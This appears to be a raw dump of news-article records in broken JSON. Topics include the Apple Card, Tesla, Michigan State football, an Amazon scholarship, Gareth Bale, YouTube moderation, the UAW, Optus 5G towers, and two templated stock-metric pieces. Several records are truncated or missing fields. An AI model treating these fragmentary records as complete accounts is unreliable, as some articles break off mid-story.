      "text": "Posted on Aug 19, 2019 \nApple\u2019s first proprietary credit card, which is issued in partnership with Goldman Sachs and entered a limited launch last week, is reportedly approving customers with low credit scores in a move to cast as wide a net as possible, according to CNBC . \nThough Apple and Goldman haven\u2019t published a score range, subprime is typically defined as consumers with FICO scores below 620; a customer with a 620 who was approved for the card spoke to CNBC, though he was given a high annual percentage rate (APR) and a $750 credit limit. \nHere\u2019s what it means: Seeking out low credit score customers could be a risky move in the current economic climate. \nOther banks reportedly turned down the Apple Card partnership due to profitability concerns. Issuers including Barclays, Citi, JPMorgan Chase, and Synchrony were rumored to have passed on the partnership. \nIn a time when return on assets (ROA) for credit cards has been declining , partly due to an uptick in charge-offs and delinquencies, a mandate to lend to subprime customers could escalate those risks and may help explain why other firms readily passed on the product. But for Goldman, which is aggressively pursuing consumer-facing financial services, these risks are likely worth the potential customer acquisition payoff. \nThe bigger picture: Thinking outside the box could help Apple and Goldman attract a wide audience for their card \u2014 but they may have to work to garner spend. \nApple Card could appeal to a swath of underserved users. As issuers tighten their lending standards in response to declining ROA, Apple Card could attract users who are restricted from other rewards cards, or even credit entirely. This could help Goldman build up a base of underserved consumers who might have otherwise turned to alternative financing or payday lending. And the card\u2019s digital focus could make it particularly attractive to younger customers with thin credit files. \nThough targeting this audience is shaping up to be a ripe customer acquisition play, it could make it challenging to attract spend. On its face, Apple Card looks to compete with products like Chase Freedom and Citi Double Cash, which target customers with minimum scores around 690 , per NerdWallet , but offers slightly weaker rewards \u2014 the top determinant of credit card selection \u2014 relative to those offerings. Though Apple Card could attract a new set of customers, the combination of low credit limits and moderate rewards might make it hard to entice frequent or high-value spending \u2014 in turn challenging habit formation around Apple Pay, which is the card\u2019s chief aim. \nInterested in getting the full story?

      "title": "Tesla\u2019s Elon Musk weighs into electric car debate",
      "text": "Tesla boss Elon Musk has weighed into Australia\u2019s electric car debate. \nElectric cars have become a hot topic in Australia following Labor\u2019s pre-election announcement that it will aim for half of Australia\u2019s new cars to be electric by 2030. \nThe aim was called into question by Coalition members sceptical of overambitious charging times, whether tradies would be willing to give up their utes, and whether electrical infrastructure is robust enough to handle 500,000 new electric vehicles hitting the road each year. \nAtlassian founder Mike Cannon-Brookes told News.com.au he is \u201cincredibly frustrated\u201d by a change in tune from the Federal Government which \u201cwill be on the wrong side of history\u201d. \nMr Cannon-Brookes tweeted that \u201cI\u2019m pretty sure Elon wouldn\u2019t think 50 per cent of new vehicles sold being electric in 11 years is in any way \u2018ambitious\u2019.\u201d \nThe outspoken Tesla founder left his 25.6 million Twitter follows with little doubt. \n\u201cNorway has already proven it could be done last month,\u201d Musk said. \n\u201cNo question Australia could do this in far fewer than 11 years.\u201d \nElectric vehicle sales have overtaken conventionally powered cars in Norway, where battery-powered machines are exempt from a 25 per cent sales tax and registration fees, among other incentives. \nThough electric vehicles represent less than 1 per cent of new car sales in Australia, a flood of new models could turn the tide. \nHyundai introduced relatively affordable electric versions of its Ioniq small car and Kona SUV in Australia this year, joining the likes of Tesla\u2019s luxury Model S sedan and Model X SUV. Jaguar\u2019s I-Pace electric SUV will be joined by Audi\u2019s e-tron and the Mercedes-Benz EQC this year. \nNissan\u2019s $49,990 Leaf electric hatch hits showrooms in August, and it will be followed by a sub-$100,000 Tesla Model 3, battery-powered Mini Cooper, Porsche\u2019s hotly-anticipated Taycan, BMW\u2019s iX3, Volvo\u2019s Polestar 2 sedan and Volkswagen\u2019s ID hatch in the next 12 months or so.",

      "text": "Souichi Terada, Special to Detroit Free Press Published 6:00 a.m. ET March 27, 2019 \nCLOSE \nMichigan State football will look to improve upon 2018's 7-6 record. Ryan Ford, Detroit Free Press \nEAST LANSING \u2014 Despite a top-ranked defense facing off against a bottom-ranked offense from 2018, it was the Michigan State football offense that came through with the victory in the Spartans\u2019 first scrimmage of spring practice on Tuesday. \nThe final tally was a 49-43 win for quarterback Brian Lewerke\u2019s crew in a modified scoring system. It was a step in the right direction for an offense after a lackluster showing in 2018. \n\u201cGot about almost 150 plays or so on a Tuesday, so we\u2019re working it,\u201d coach Mark Dantonio said of the scrimmage. \u201cI thought guys took a step forward. Some explosive plays out there on the offensive side of the ball.\u201d \nAnd any questions of Lewerke\u2019s right (throwing) shoulder can be put to rest. Lewerke, who didn\u2019t throw for a month after the 2018 season to rest the injury, said he feels at 100 percent through the opening two weeks. \nHis wide receivers agreed, namely Cody White, who said the ball coming off Lewerke\u2019s hand looked just like it did before the injury. \n\u201cObviously, there\u2019s soreness just like any injury, but I do feel much better than what I did,\u201d Lewerke said. \nIt was also the first chance to see a new-look offense under new offensive coordinator Brad Salem, who moved from quarterbacks coach . Dave Warner (quarterbacks) and Jim Bollman (offensive line) shared the duties, but were reassigned as position coaches in the offseason. \nCornerback Josiah Scott said the offense caught him and the other defenders off-guard at first, when the offense mixed in some tempo and other wrinkles. \n\u201cThey tried to get up to the ball, get the defense confused a bit,\u201d Scott said of the offense. \u201cSo that\u2019s been a bit an asset to them, helping them out.\u201d \nThe Spartans concluded their seventh practice of the 15 practices allotted by NCAA rules. The scrimmage was also their first of three. MSU\u2019s annual spring game is scheduled for 2 p.m. April 13 at Spartan Stadium. \nEarly enrollees \nSpring football provides a first look at the class of 2019 recruiting class, some of whom are already on campus as early enrollees . \nAlready in the first couple weeks of practice, wide receiver Tre Mosley and running back Anthony Williams Jr. have made splashy plays in practice and in the scrimmage. \n\u201cThere\u2019re a couple of guys on the offensive and defensive line, that type of thing,\u201d Dantonio said of his early enrollees. \u201cBut I think that the skill players show up a little faster.\u201d \nBack to the punting \nAfter cycling through four full-time punters during 2018, starter Jake Hartbarger, who suffered a season-ending injury at Arizona State in September, is back and ready to go. But in his shadow is someone who holds some intrigue to MSU fans, Australian punter Jack Bouwmeester. \nThe spring scrimmage allowed Bouwmeester to get some new experiences under his belt. \n\u201cIt was interesting because this was his first day of taking an actual punt in practice in the stadium,\u201d Dantonio said of Bouwmeester. \u201cHe\u2019s a talented guy and he\u2019ll have his opportunities.\u201d \nOfficially, Hartbarger is still waiting on the OK from the NCAA on his request for a sixth year of eligibility.",

      "text": "Chatham High School senior Ryan Sherman has been selected by Amazon to receive the first-ever Amazon Future Engineer scholarship of $10,000 per year over four years to study computer science at a college of his choice. \nSherman will also receive a guaranteed paid internship offer at Amazon after his freshman year of college to gain work experience. \n\u201cI am honored to receive this scholarship,\" Sherman said. \"I am really excited to study computer science in college and pursue my interest in deep learning and its application in the field of medicine.\u201d \nSherman was one of only 100 high school seniors selected nationally. Recipients were chosen for their academic achievement, demonstrated leadership, participation in school and community activities, work experience, future goals, and diversity. \n\u201cWe are so proud of the work Ryan has done while at CHS,\" Chatham High Principal Darren Groh said. \"He is well deserving of this award and we expect that he is going to do amazing things while in college and beyond.\u201d \nDr. Mark Jones, a teacher of mathematics and computer science at Chatham High School, has had Sherman as a student in the Advanced Placement Computer Science course, and he has mentored him in several research projects. \n\u201cRyan is the most accomplished computer science student in the high school currently,\" Dr. Jones said, \"and one of the top computer science students that I have encountered in my many years of teaching. He is an amazing self-starter and an intrinsically motivated student.\u201d \nTwo years ago, Sherman wrote an article titled \u201cThe Promise of Privacy Centric AI\u201d that was published online. The article explores the benefits of incorporating privacy protocols into machine learning. Britain\u2019s National Health Services recently approved his application to start an international community focused on drug discovery with deep learning, as well as developing open sourced intelligent software that allow doctors to provide patients with more personalized treatment. \nLast year, Sherman conducted a research project using deep learning techniques to segment brain tumors in 3D MRI scans. He had to acquire the MRI dataset, to learn about the medical issues involved, and to teach himself several new technologies, including the Python programming language and the TensorFlow machine learning framework. \nThis project was only his most recent in a succession of similar machine learning approaches to medical diagnoses \u2013 diagnosing breast cancer, detecting signs of Alzheimer\u2019s disease, and detecting early-stage lung cancer from CT scans. These are accomplishments that would be incredible for college upperclassmen, let alone a junior in high school. For fun, when not diagnosing diseases, Ryan builds quadcopters and programs drones. \nSherman has been heavily involved in Key Club, serving as the Webmaster and as an Organizer for the Community Outreach Project. He also served as the Vice President of the Research Club and Co-President of both the App Inventor Club and the National Math Honor Society. He has been in the Student Council, serving as the Chief of Staff and the Director of Fundraising. He is also an athlete, a member of the soccer team, winter track team, and spring track team throughout high school. \n\u201cWe are confident that these scholarship recipients are our country\u2019s next generation of world-changing inventors and leaders. They are an impressive, hard-working group, and we\u2019re thrilled to call them our first class of Amazon Future Engineer scholarship winners,\u201d said Jeff Wilke, CEO, Worldwide Consumer, Amazon. \u201cThis scholarship is a reflection of our appreciation for the work these students have done so far, and an investment in them and the future we all share. We are eager to see the bold paths paved by these students as college students, Amazon interns, and beyond.\u201d \nThe Bureau of Labor Statistics projects that by 2020 there will be 1.4 million computer-science-related jobs available and only 400,000 computer science graduates with the skills to apply for those jobs. Computer science is the fastest-growing profession within the Science, Technology, Engineering and Math (STEM) field, but only 8% of STEM graduates earn a computer science degree, with a small number from underprivileged backgrounds. Students from underprivileged backgrounds are 8 to 10 times more likely to pursue college degrees in computer science if they have taken AP computer science in high school.",

      "text": "Quality Sport Images/Getty Images \nReal Madrid right-back Alvaro Odriozola believes Gareth Bale is \" too shy to use\" Spanish in the dressing room despite knowing the language \"perfectly.\" \nMarcelo said last month that the Welshman \" only speaks English\" in the dressing room, and Thibaut Courtois added to the picture of Bale as something of a loner at Real when he revealed he missed a team dinner because he thought it was too late: \nB/R Football @brfootball \nWith Ronaldo gone, this was supposed to be Bale's breakout season. Real Madrid's gamble has failed. | @Richard_Fitz https://t.co/w0uhHd91Bc \nHowever, Odriozola has now defended Bale and said the former Tottenham Hotspur man is committed to Real, despite rumours linking him with a move away from the Santiago Bernabeu, per La Galerna (h/t Goal ): \n\" He looks good to me. Against Celta he played a great game. He worked hard, he is very motivated. H e knows Spanish perfectly, the thing is that he is too shy to use it, which seems normal to me. I speak with him in Spanish and English, without distinction. And I see that his commitment to the club is total. He is a Madrid fanatic and he has given everything for the club. He is a great player, I don't need to say it. The pace, the power. And his precision in front of goal. I like him a lot. \" \nBale, 29, has, on the face of it, been a huge success since moving to Real from Spurs for \u00a385 million back in 2013. \nHe has won a La Liga title, a Copa del Rey, four UEFA Champions Leagues and netted 78 goals in 148 league appearances for the club. \nHowever, there is still the overwhelming sense that the forward has been a disappointment at the club, and he has never been a fan favourite: \nB/R Football @brfootball \nGareth Bale\u2019s agent has some opinions about Real Madrid fans \ud83d\ude24 https://t.co/QenwIHkcdK \nOne of the key frustrations has been his ongoing injury problems, which have plagued him almost since the moment he moved to Madrid. \nOdriozola said Bale cannot be blamed for his fitness issues, per La Galerna (h/t Goal ) : \" Nobody can choose that. There are players who are more susceptible to injury, others less so. But he works so hard in the gym, he takes great care of himself.\" \nThe return of Zinedine Zidane to the manager's role at Real could have a major impact on Bale's future. \nHe was not a regular starter last season under the Frenchman, and he said after coming off the bench to win Real the 2018 UEFA Champions League final in May that he would have to consider his future if that continued: \nFootball on BT Sport @btsportfootball \n\"I need to be playing week-in-week-out...that hasn't happened this season.\" \ud83d\udc40\ud83d\udc40\ud83d\udc40 Gareth Bale speaks to @DesKellyBTS about his Real Madrid future... https://t.co/cbcDC6Otvh \nBale started Zidane's first game back in charge against Celta Vigo and scored Real's second in a 2-0 win. \nHowever, Lucas Vazquez and Vinicius Jr. were both sidelined for that clash through injury, and Bale may not be certain of a starting spot when one or both of them return.",

      "title": "Fiat Chrysler will pay Tesla to dodge billions in emissions fines",
      "text": "Fiat Chrysler Automobiles (FCA) has struck a deal with Tesla to count the Silicon Valley automaker\u2019s cars as part of its fleet in the European Union, lowering FCA\u2019s average emissions output ahead of strict new EU regulations coming in 2021. Tesla will make \u201chundreds of millions of euros\u201d from the sale of these emissions credits, according to the Financial Times . \nThe scheme resembles the way regulatory credits can be bought and sold in the United States, which has been a steady (if relatively small) business for Tesla for many years. The electric automaker made $103 million selling emissions credits in 2018, $280 million in 2017, and $215 million in 2016, according to a recent financial filing . \nFCA, which owns brands like Jeep and Dodge, announced in mid-2018 that it plans to spend 9 billion euros (or just over $10 billion) by 2022 to add more electric and hybrid cars to its lineup. But analysts have said that is likely not enough to avoid billions of euros in fines for exceeding the EU\u2019s target, which is 95 grams of CO2 per kilometer average across a carmaker\u2019s whole fleet. In 2018, Fiat Chrysler\u2019s average was estimated at 123 grams per kilometer. \nNot only are the FCA fleet\u2019s average emissions among the worst in the industry, the automaker was sued by the US Department of Justice in 2017 for allegedly using software to fool regulators into thinking its cars were compliant. FCA settled those charges for $800 million without admitting any wrongdoing, but it also recently recalled nearly 1 million vehicles in the US for violating emissions standards . \nTesla brought in $21.4 billion in revenue in 2018 , with $7.2 billion coming in the final quarter alone, so hundreds of millions of euros will make up a small portion of the overall money the company generates. But Tesla might still need help with its cash this year. While the company hasn\u2019t released financial figures for the first quarter of 2019, it announced last week that it saw a quarter-to-quarter decline in deliveries for the first time in almost two years . And CEO Elon Musk said in February that he didn\u2019t expect the company to turn a profit in the first quarter after posting back-to-back profits for the first time in the company\u2019s history in the second half of 2018. \nTesla finished 2018 with $3.7 billion in cash, but $920 million of that was used to pay off some of the company\u2019s $11 billion debt that came due in March. Following the release of the delivery figures, some typically bullish Wall Street analysts (like Morgan Stanley\u2019s Adam Jonas) estimated that the automaker burned through more of those reserves this quarter. Jonas and others have also estimated that Tesla will need to raise more money this year \u2014 something Musk has denied.",

      "title": "CSE Global Limited (SGX:544) Six Month Price Index Level Reaches 1.12632",
      "text": "Active investors may be taking a second look at shares of CSE Global Limited (SGX:544). Checking in on some levels, the six month price index is currently at 1.12632. The six month price index is measured by dividing the current share price by the share price six months ago. A ratio above one indicates an increase in the stock price over the six month time frame. A ratio under one signals that the price has lowered over that same time frame. \nAmateur investors can sometimes become overwhelmed by the speed and volatility of the stock market. Often times, avoiding big mistakes early on can be the difference between staying in the game or being prematurely forced to the sidelines. One of the biggest mistakes that a new investor can make is not creating a realistic plan. A well-crafted plan will generally include risk tolerance, time horizon, and amount and frequency of investments. Having a clear plan for attaining goals can help the investor stay focused when the terrain gets rocky. Another common mistake for investors is buying high and selling low. Of course, everybody preaches the buy low sell high mantra, but it is much easier said than done. Getting caught up in the day to day market swings can lead the investor to do just the opposite and become a hot stock chaser instead of a disciplined decision maker. \nGM Score \nThe Gross Margin Score is calculated by looking at the Gross Margin and the overall stability of the company over the course of 8 years. The score is a number between one and one hundred (1 being best and 100 being the worst). The Gross Margin Score of CSE Global Limited (SGX:544) is 18.00000. The more stable the company, the lower the score. If a company is less stable over the course of time, they will have a higher score. \nLooking at stock market performance over the last few months, new investors may be worried that they might have missed out on some fantastic opportunities. With so much information and data available, they may not even know where to begin when getting into the stock investing arena. Everybody has to start somewhere, and becoming knowledgeable about the basics may help provide the perfect springboard from which to launch. Starting with the basics may help the investor understand the bigger picture which can then be filtered down into specifics. Because there is no magic formula to achieving success in the stock market, investors may have to explore many different strategies before choosing one to run with. \nFCF \nFree Cash Flow Growth (FCF Growth) is the free cash flow of the current year minus the free cash flow from the previous year, divided by last year\u2019s free cash flow. The FCF Growth of CSE Global Limited (SGX:544) is -0.192650. Free cash flow (FCF) is the cash produced by the company minus capital expenditure. This cash is what a company uses to meet its financial obligations, such as making payments on debt or to pay out dividends. The Free Cash Flow Score (FCF Score) is a helpful tool in calculating the free cash flow growth with free cash flow stability \u2013 this gives investors the overall quality of the free cash flow. The FCF Score of CSE Global Limited (SGX:544) is -0.997581. Experts say the higher the value, the better, as it means that the free cash flow is high, or the variability of free cash flow is low or both. \nInvestors keeping an eye on shares of CSE Global Limited (SGX:544) may be examining the company\u2019s FCF or Free Cash Flow as well. FCF is a measure of the financial performance of a company. FCF is calculated by subtracting capital expenditures from operating cash flow. Currently, CSE Global Limited has an FCF score of -0.997581. The FCF score is an indicator that is calculated by combining free cash flow stability with free cash flow growth. Typically, a higher FCF score value would indicate high free cash flow growth. The company currently has an FCF quality score of 0.191972. The free quality score helps estimate free cash flow stability. FCF quality is calculated as the 12 ltm cash flow per share over the average of the cash flow numbers. With this score, it is generally considered that the lower the ratio, the better. \nInvestors may be diving into the latest company earnings reports trying to scope out some quality stocks to add to the portfolio. Nobody knows for sure which way overall market momentum will sway as we near the close of the calendar year. Investors may be getting ready to do a portfolio review to see which stocks are worthy to hold, and which ones have underperformed a may need to be unloaded. Regularly monitoring stock investments may keep the investor ready for any big market changes that may occur. \nInvestors may also be watching company stock volatility data. CSE Global Limited (SGX:544)\u2019s 12 month volatility is presently 28.168700. The 6 month volatility is 25.992300, and the 3 month is noted at 25.097400. Stock price volatility may be used to identify changes in market trends. When markets become very volatile, this may point to a change in investor sentiment. Watching volatility in combination with other technical indicators may help investors discover important trading information. \nActive traders are often looking for the next great move to secure profits in the stock market. Traders might be tracking stocks that are primed for a breakout. When a stock suddenly breaks to the upside, it has the potential to bring the optimistic crowd along with it. The breakout may bring in traders who missed out on the beginning of a run trying to capitalize on the back end. The professional trader is typically one who is able to stand out from the crowd. Being able to separate fantasy from reality can mean big profits for the dedicated trader. Impulse buying or selling on good or bad news is common in the stock market. Being able to come to a reasonable conclusion about why stock prices are headed one way and not the other can be a tough proposition. Paying attention to all the headlines may lead some traders down the path of no return if trades are being made strictly on daily news or even perception or that news. Discerning between what is actually driving a stock and what is perceived to be driving a stock may end up being a large factor between future gains and losses in the equity market.",

      "title": "YouTube execs reportedly shrugged off warnings about toxic videos",
      "text": "YouTube leaders ignored proposals to alter recommendations to stamp out toxic videos and to tackle conspiracy theories, several former and current employees told Bloomberg . Executives were more concerned with keeping viewers engaged, according to the report. \n\"Scores\" of YouTube and Google employees noted their concerns about the \"mass of false, incendiary and toxic content\" over the last few years. Many suggested changes to YouTube executives or tracked the prevalence and popularity of toxic videos to show senior management the extent of the problem. However, the word reportedly came from on high to stay the course in the hopes of avoiding a dip in engagement metrics. \nYouTube employees have wrestled with executives' approach to the platform's problems. Five senior staff members who left the company over the last couple of years claimed YouTube's long-standing \"inability to tame extreme, disturbing videos\" was why they departed. \nStill, outlandish content can draw attention, potentially leading to significant advertising revenue. Parent company Alphabet typically doesn't disclose YouTube revenue numbers in earnings reports, though the video-sharing platform is estimated to pull in north of $16 billion per year. \nA spokeswoman refuted some of the report's claims, including that CEO Susan Wojcicki \"is inattentive to these issues and that the company prioritizes engagement above all else,\" according to Bloomberg . \nThe service has been focused on finding solutions for some of its \"toughest content challenges\" over the last two years, a spokesperson told Engadget in a statement. Those measures include \"updating our recommendations system to prevent the spread of harmful misinformation, improving the news experience on YouTube, bringing the number of people focused on content issues across Google to 10,000 , investing in machine learning to be able to more quickly find and remove violative content, and reviewing and updating our policies .\" \nYet several years before YouTube pledged to stop recommending conspiracy videos , a privacy engineer suggested that videos skirting the edges of the site's content policies shouldn't be included in recommendations. His proposal was rejected at the time, according to the report, though YouTube eventually adopted the idea this January. YouTube has added other measures to combat false content, including information panels on video pages and search results that offer truthful information on sensitive or controversial topics. \nMeanwhile, Motherboard reports white nationalist and neo-Nazi propaganda videos are freely available on YouTube. The publication shared some examples with the service, which removed advertising from them, added content warnings and made sure they didn't appear in recommendations. But the videos are still on YouTube, and you can view them via search results. \nSource: Bloomberg",

On Thursday, he was picked as the permanent replacement by the UAW International Executive Board on a unanimous vote and will fill the rest of Jones\u2019 term ending in 2022. \n\u201cThis is an honor to complete my career and serve the members of this great union in this capacity,\u201d Gamble said. \u201cThis wasn\u2019t planned and it is a tall order.

In late August, the FBI searched his home and, according to reports, court documents that do not name him have accused the former union president of embezzling union money. Jones has nevertheless not been charged. \nGamble played an important role in recent contract negotiations between the UAW and Ford, General Motors, and Fiat Chrysler Automobiles. Earlier this week , it was announced that a new deal between the UAW and FCA will go to members for a vote beginning Friday, concluding this year\u2019s bargaining with the Detroit Three. \n\u201cTogether, our members, local leaders and our board have an opportunity to set the UAW on a course for generations,\u201d Gamble added following his election. \u201cThere are many opportunities through new technology; new jobs; new organizing drives and collective bargaining gains to lift up our families, our communities and the middle class.

      "text": "Derrick White played like he had not eaten in two days, Nuggets coach Michael Malone said after seeing his team undone by the unheralded Spurs point guard. \nSan Antonio took a 2-1 lead in their first-round playoff series against the second-seeded Nuggets with a 118-108 home victory Thursday. \nRelated News \nThe Spurs were paced by White, who put up a career-high 36 points in just his third playoff start, and coach Gregg Popovich let that performance speak for itself rather than offering any great praise of their 2017 first-round pick. \n\"He's OK,\" Popovich joked. \"He was obviously spectacular. I don't know what else to say.\" \nMalone, meanwhile, had plenty of words about White, who was born in Colorado and played his college basketball in Boulder. \nHe felt White's performance was in part a response to Nuggets guard Jamal Murray's fourth-quarter showing in Game 2, which saw him rack up 21 points in the final quarter of a Nuggets victory. \n\"There's no doubt in my mind that Derrick White, the last couple of days, has been reminded about Jamal Murray's fourth-quarter performance,\" Malone said. \"Derrick White came out like he hadn't eaten in two days. \n\"He came out hungry. He came out pissed off. And he sent a very loud and clear message. \n\"Now I'm anxious to see our guys. How do we respond to that? Where is your pride? Where is your toughness? Where is your grit? So Game 4 is going to be great insight to who we are as a team, especially our young players, especially Jamal Murray. \n\"Great fourth quarter, we win Game 2. Well, he's going to learn as a young kid. It can't be just one quarter, it has to be every night if you want to be a really good basketball player, especially in the playoffs. \n\"It's defense. Derrick White dominated the game tonight. Jamal, first and foremost, has to take a lot more pride in his ability to guard and contain and make Derrick White feel him. Derrick White did not feel us tonight.\" \nThe Spurs take a 2-1 series lead into Game 4 Saturday in San Antonio.",

      "text": "A U.S. judge has ordered the SEC and Tesla CEO Elon Musk to confer over the next two weeks to try to settle the matter over contempt. \nTesla laid off dozens of in-store sales employees, the electric carmaker said on Monday, as the company looks to reduce its physical footprint across the U.S. and shift operations online . \nThe staff reductions hit stores in Chicago, Brooklyn, New York and Tampa, Florida, but a spokeswoman declined to share the exact number. \nMORE FROM FOX BUSINESS... \nThe layoffs \u2013 first reported by Bloomberg -- were previewed in a recent blog post where Tesla outlined its new strategy, as well as a subsequent email from owner Elon Musk where he warned that \u201csome jobs would be impacted or transitioned to other areas of the business.\u201d \n\u201cThis is a hard decision, but it necessary to make our cars more affordable.

      "title": "Optus wants new mobile tower rules to steam roll obstinate councils and owners",
      "text": "ericsson-small-cell-strand-mount-unit.jpg \nSingtel-owned Australian telco Optus has called for rule changes that would compress Australia's three layers of government overseeing mobile tower deployments into a consistent, uniform national scheme that would speed up the rollout of 5G. \nTo that end, the telco released a discussion paper on Friday that details its arguments, and also calls for telcos to be able to make \"necessary minor and safe modifications\" to utility poles already in place in order to add small cells. \n\"Current deployment rules are governed by multiple tiers of governments, each with differing compensation schemes, zoning and installation exemptions,\" Optus vice-president of regulatory and public affairs Andrew Sheridan said last week. \n\"The rules, which were originally designed two decades ago for large infrastructure deployment, do not appear to address some of the practical implementation issues involved in the mass deployment of 5G small cell infrastructure.\" \nWhile the deployment of small cells would usually fall under low impact exemptions, Optus complained that heritage laws sometimes applied to poles and what it called \"non-heritage items\", as well as to small cells deployed in residential areas. \nThe telco added that it often has to pay rent to pole owners, as well as to land owners upon which the pole is located. \n\"The issue is whether pole and land owners should be able to profit and delay the deployment of advanced 5G networks,\" Optus said. \n\"We also observe an increasing trend of land owners, utilities and state entities viewing the future deployment of more cells and fibre links as a potential revenue source, rather than as an economic development. \n\"Clearly, this situation was not envisaged in 1997 when the legislation was introduced -- a regime designed for stand-alone towers is not suitable for small cells that attach to existing infrastructure.\" \nOptus did concede though, the sort of economic benefits that 5G proponents push are due to happen with the deployment of standalone 5G. Networks such as those in South Korea are using non-standalone 5G, which lowers cost, but uses a 4G core. \nInitially, small cells would be used to fill coverage gaps, Optus said in its paper. \n\"The full benefits of 5G will be achieved with densification of the [radio access network and the re-design of the network from macro-based to one which primarily uses small cells to deliver the speed and coverage required,\" it said. \n\"In urban areas, this means potentially 10 times more urban sites will be required.\" \nTower placement sees Labor refer matter to ANAO \nOn Monday morning, Labor said it had referred a matter regarding the placement of a mobile tower in the southern New England region to the Australian National Audit Office (ANAO). \nOver the weekend, Nine media reported a tower was placed at Kingstown on the property of mining magnate Gina Rinehart, despite the local community arguing for another site. \nIt is reported that locals said after two weeks of operation, the tower's service has been non-existent a couple of kilometres away from it, even though it is meant to provide emergency services to the district. Federal local member Barnaby Joyce reportedly said the site of the tower was chosen by Telstra. \nRinehart is paid rent for the tower, which falls under the federal government's mobile blackspots program. \n\"The actions of the Member for New England suggest the Coalition is more concerned with their own interests, rather than making a genuine attempt to improve mobile coverage in regional Australia,\" Labor's Shadow Minister for Regional Communications Stephen Jones said in a statement on Monday. \nA September 2016 audit by the ANAO into the blackspots program said the Department of Communications had erred in its selection criteria and ability to evaluate impact and cost effectiveness. \nSpecifically, ANAO said at the time, the department's selection criteria: Allowed for the expansion and improvement of existing coverage, rather than providing coverage to areas with no mobile access; did not have methodologies for assessing the technical and financial aspects of proposals, especially in regards to applicant costings; and said the department did not have a sufficient capacity to assess the impact and cost effectiveness of the program, because there was no evaluation framework formed beforehand. \n\"The department's assessment of applicant costings for proposed base stations lacked sufficient rigour,\" the ANAO report said. \nRelated Coverage",

      "title": "An Inside Look at the Quant Data for: Korea Electric Power Corporation (KOSE:A015760), RPM International Inc. (NYSE:RPM)",
      "text": "Here we will take a look into some valuation metrics for Korea Electric Power Corporation KOSE:A015760 shares. \nPrice-To-Cash-Flow-Ratio is a term that indicates the degree of cash flow valuation of the enterprise in the securities market. It is derived from the P/E \u2013 Price Earnings Ratio , in which the profit is replaced by cash flow . Unlike P/E, the ratio isn\u2019t affected by the chosen depreciation methods, making it suitable for geographic comparison. Korea Electric Power Corporation currently has a P/CF ratio of 2.762889. \nEquity market investors have plenty of information available to them when making stock selections. One of the toughest parts of selecting stocks may be figuring out which data to pay attention to. There are always swirling headlines in today\u2019s financial news media. While some information may be highly important, other information may be much less important. Knowing exactly what to look for when doing stock research may take a lot of time to master. Investors who are able to stay highly focused may find it much easier to spot opportunities in the market. Once the investor knows what to look for, the stock market puzzle may be a bit easier to start piecing together. \nVolatility \nWatching some historical volatility numbers on shares of Korea Electric Power Corporation (KOSE:A015760), we can see that the 12 month volatility is presently 28.636700. The 6 month volatility is 33.404700, and the 3 month is spotted at 25.076900. Following volatility data can help measure how much the stock price has fluctuated over the specified time period. Although past volatility action may help project future stock volatility, it may also be vastly different when taking into account other factors that may be driving price action during the measured time period. \nWe can now take a quick look at some historical stock price index data. Korea Electric Power Corporation (KOSE:A015760) presently has a 10 month price index of 0.84160. The price index is calculated by dividing the current share price by the share price ten months ago. A ratio over one indicates an increase in share price over the period. A ratio lower than one shows that the price has decreased over that time period. Looking at some alternate time periods, the 12 month price index is 0.85130, the 24 month is 0.68081, and the 36 month is 0.55043. Narrowing in a bit closer, the 5 month price index is 1.07223, the 3 month is 0.83454, and the 1 month is currently 0.82143. \nValuation Ratios \nLooking at some ROIC (Return on Invested Capital) numbers, Korea Electric Power Corporation (KOSE:A015760)\u2019s ROIC is -0.001373. The ROIC 5 year average is 0.047433 and the ROIC Quality ratio is 8.932461. ROIC is a profitability ratio that measures the return that an investment generates for those providing capital. ROIC helps show how efficient a firm is at turning capital into profits. In terms of EBITDA Yield, Korea Electric Power Corporation (KOSE:A015760) currently has a value of 0.120792. This value is derived by dividing EBITDA by Enterprise Value. \nThe Price to Book ratio (Current share price / Book value per share) is a good valuation measure you can use to find undervalued investment ideas. A low Price to Book could indicate that the shares are undervalued in their industry. Generally speaking a P/B ratio under 1 is considered low and is best used in relation to asset-heavy firms. At the time of writing Korea Electric Power Corporation (KOSE:A015760) has a price to book ratio of 0.264631. \nThe Leverage Ratio of Korea Electric Power Corporation (KOSE:A015760) is 0.334126. Leverage ratio is the total debt of a company divided by total assets of the current and past year divided by two. Companies take on debt to finance their day to day operations. The leverage ratio can measure how much of a company\u2019s capital comes from debt. With this ratio, investors can better estimate how well a company will be able to pay their long and short term financial obligations. \nInvestors may be trying to decide which way the stock market will shift over the next couple of quarters. Having a general idea based on research is one thing, but constantly trying to time the market may lead to negative portfolio performance. Of course, overall market downturns can be frustrating to everyone invested in shares. Being able to ride out the day to day volatility and make proper investing decisions based on solid stock examination, may help the investor secure profits down the line. Investors who spend too much time focusing on stocks that have already made a run may find themselves in a sticky situation if they get into the name to late. Just because a certain stock has been going up for a long time, it doesn\u2019t mean that the momentum will be sustained into the future. Taking the time to find quality stocks instead of just looking at the hot stock of the day, may allow investors to keep thriving in the market. \nThere are many different tools to determine whether a company is profitable or not. One of the most popular ratios is the \u201cReturn on Assets\u201d (aka ROA). This score indicates how profitable a company is relative to its total assets. The Return on Assets for Korea Electric Power Corporation (KOSE:A015760) is -0.007231. This number is calculated by dividing net income after tax by the company\u2019s total assets. A company that manages their assets well will have a higher return, while a company that manages their assets poorly will have a lower return. \nThe Value Composite One (VC1) is a method that investors use to determine a company\u2019s value. The VC1 of Korea Electric Power Corporation (KOSE:A015760) is 10. A company with a value of 0 is thought to be an undervalued company, while a company with a value of 100 is considered an overvalued company. The VC1 is calculated using the price to book value, price to sales, EBITDA to EV, price to cash flow, and price to earnings. Similarly, the Value Composite Two (VC2) is calculated with the same ratios, but adds the Shareholder Yield. The Value Composite Two of Korea Electric Power Corporation (KOSE:A015760) is 8. \nInvestors may be wondering what\u2019s in store for the next couple of months in terms of the stock market. Bull markets are times when investors may be willing to take some liberties with stock picks. Risk management is typically on the minds of many investors. Investors trying to gain an advantage may be searching for the perfect balance and diversification to help ease the risk and give the portfolio a needed boost. With so many different stocks to study, it may take a while to hone in on the proper ones. Investors will also be closely following the next round of economic data. Investors may be on the lookout for the next major data announcement that either keeps the bulls in charge or ushers in the bears. \nAt the time of writing, Korea Electric Power Corporation (KOSE:A015760) has a Piotroski F-Score of 4. The F-Score may help discover companies with strengthening balance sheets. The score may also be used to spot the weak performers. Joseph Piotroski developed the F-Score which employs nine different variables based on the company financial statement. A single point is assigned to each test that a stock passes. Typically, a stock scoring an 8 or 9 would be seen as strong. On the other end, a stock with a score from 0-2 would be viewed as weak. 